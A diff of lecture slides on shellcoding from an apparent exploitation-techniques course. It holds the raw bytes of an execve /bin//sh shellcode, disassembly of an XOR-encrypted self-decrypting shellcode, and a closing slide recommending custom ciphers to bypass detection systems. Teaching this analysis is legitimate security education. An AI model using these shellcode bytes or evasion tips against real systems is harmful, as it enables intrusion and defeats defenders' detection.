@@ -450,13 +450,14 @@ class: center, middle
 
 ---
 
-## Shellcoding [1/6 introduction]
+## Shellcoding [1/7 introduction]
 
 ### What is a shellcode?
 
-Very simple (naive) shellcode: `execve /bin//sh`
+- Very simple (naive) shellcode: `execve /bin//sh`
 
-Smth like: `31 c9 f7 e1 b0 0b 51 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 cd 80` (21 Bytes)
+- Smth like: `31 c9 f7 e1 b0 0b 51 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 cd 80`
+(*naive, static, 21B shellcode*)
 
 ### Code as data
 
@@ -467,11 +468,22 @@ Smth like: `31 c9 f7 e1 b0 0b 51 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 cd 80` (21 
     - But code *can also be stored as "normal data"*,
       e.g. exploiting a buffer overflow
 
+???
+
+## Initial notes
+
+- What I will say *depends on the architecture*, in this case: `x86`
+    - `x86_64` (commonly used in modern PCs) is similar but with small
+      differences, e.g. first argument is not pushed into the stack
+    - `arm` (commonly used in smartphones and embedded devices) is a lot
+      different
+- If you have doubts, take a look at the Intel Developer Manual
+
 ---
 
 class: center, middle
 
-## Shellcoding [2/6 the problem]
+## Shellcoding [2/7 the problem]
 
 Naive (static) shellcode is *easy to fingerprint*
 
@@ -481,7 +493,7 @@ Is there some sort of *dynamic* shellcode?
 
 ---
 
-## Shellcoding [3/6 analysis]
+## Shellcoding [3/7 analysis]
 
 ```objdump-c
 0:   29 c9                  sub    %ecx,%ecx
@@ -511,20 +523,9 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 *It's strange: there isn't a shellcode, I don't see smth like `/bin/sh`, wtf ???*
 
-???
-
-## Initial notes
-
-- What I will say *depends on the architecture*, in this case: `x86`
-    - `x86_64` (commonly used in modern PCs) is similar but with small
-      differences, e.g. first argument is not pushed into the stack
-    - `arm` (commonly used in smartphones and embedded devices) is a lot
-      different
-- If you have doubts, take a look at the Intel Developer Manual
-
 ---
 
-## Shellcoding [4/6 analysis | 1/2 flow-control]
+## Shellcoding [4/7 analysis | 1/2 flow-control]
 
 .left-column[
 ### .twitch-emote.small[DOOMGuy] brainstorming ..
@@ -561,7 +562,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 2/2 flow-control]
+## Shellcoding [4/7 analysis | 2/2 flow-control]
 
 <img uml="
 (*) --> 1: Initialize
@@ -574,7 +575,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 1/6 initialization]
+## Shellcoding [4/7 analysis | 1/6 initialization]
 
 .left-column[
 ### .twitch-emote.small[DOOMGuy] brainstorming ..
@@ -612,7 +613,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 2/6 initialization]
+## Shellcoding [4/7 analysis | 2/6 initialization]
 
 ```objdump-c
 0:   29 c9                  sub    %ecx,%ecx
@@ -627,7 +628,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 3/6 initialization]
+## Shellcoding [4/7 analysis | 3/6 initialization]
 
 ```objdump-c
 0:   29 c9                  sub    %ecx,%ecx
@@ -643,7 +644,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 4/6 initialization]
+## Shellcoding [4/7 analysis | 4/6 initialization]
 
 ```objdump-c
 18:  e8 e7 ff ff ff         call   0x4
@@ -673,7 +674,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 5/6 initialization]
+## Shellcoding [4/7 analysis | 5/6 initialization]
 
 ```objdump-c
 4:   5e                     pop    %esi
@@ -689,7 +690,7 @@ Normally *you don't know that the shellcode is right after the `CALL` instructio
 
 ---
 
-## Shellcoding [4/6 analysis | 6/6 initialization]
+## Shellcoding [4/7 analysis | 6/6 initialization]
 
 ```objdump-c
 5:   b1 14                  mov    $0x14,%cl
@@ -724,7 +725,7 @@ BTW, I can say that because *I already know the solution*... Normally *you don't
 
 ---
 
-## Shellcoding [4/6 analysis | 1/4 decryptor]
+## Shellcoding [4/7 analysis | 1/4 decryptor]
 
 ### Decryptor overview
 
@@ -742,7 +743,7 @@ f:   32 46 ff               xor    -0x1(%esi),%al
 
 ---
 
-## Shellcoding [4/6 analysis | 2/4 decryptor]
+## Shellcoding [4/7 analysis | 2/4 decryptor]
 
 ### Decryption loop
 
@@ -770,23 +771,45 @@ Taking a look at the [Intel Developer Manual](http://www.intel.com/content/dam/w
 
 ---
 
-## Shellcoding [4/6 analysis | 3/4 decryptor]
+## Shellcoding [4/7 analysis | 3/4 decryptor]
 
 ### Decryption step
 
-TODO
+Every cycle:
+
+- Retrieve the next instruction bytes:
+
+```objdump-c
+7:   46                     inc    %esi
+8:   8b 06                  mov    (%esi),%eax
+```
+
+- Store the updated bytes back to the shellcode storage area:
+
+```objdump-c
+12:  88 06                  mov    %al,(%esi)
+```
 
 ---
 
-## Shellcoding [4/6 analysis | 4/4 decryptor]
+## Shellcoding [4/7 analysis | 4/4 decryptor]
 
 ### Decryption algorithm
 
-TODO
+```objdump-c
+a:   83 e8 09               sub    $0x9,%eax
+d:   34 9f                  xor    $0x9f,%al
+f:   32 46 ff               xor    -0x1(%esi),%al
+```
+
+Summing up, the shellcode implements a custom *stream cipher algorithm*:
+- `XOR` *static*
+- `XOR` *pseudorandom*
+- `ADD` *static*
 
 ---
 
-## Shellcoding [4/6 analysis | shellcode]
+## Shellcoding [4/7 analysis | shellcode]
 
 ### Encrypted shellcode
 
@@ -811,7 +834,7 @@ Each instruction will be:
 
 ---
 
-## Shellcoding [5/6 structure]
+## Shellcoding [5/7 structure]
 
 ```python
 # 1. NOP sledge
@@ -835,10 +858,28 @@ Each instruction will be:
 
 ---
 
-## Shellcoding [6/6 execution]
+## Shellcoding [6/7 execution]
 
 Let's take a look at how we can develop / test / execute shellcodes:
 [shellcode.c](https://github.com/alem0lars/adv_exp_tec/blob/gh-pages/resources/shellcode.c)
+
+---
+
+## Shellcoding [7/7 notes]
+
+- A custom cipher has been used
+- Using pre-made ciphers / libraries makes the shellcode easy to fingerprint
+    - Not always it's a good solution
+    - Best way to bypass detection systems is to roll your own algorithm
+    - Most of times, it doesn't need to be safe
+    - Almost the opposite vision of software development,
+      where you want to reuse existing encryption algorithms and libraries
+
+
+- More advanced obfuscation / encryption mechanisms exist:
+    - Virtual-Machine based malwares
+    - Packed / Obfuscated malwares, using custom algorithms and implementations
+    - Non-deterministic malwares
 
 ---
 
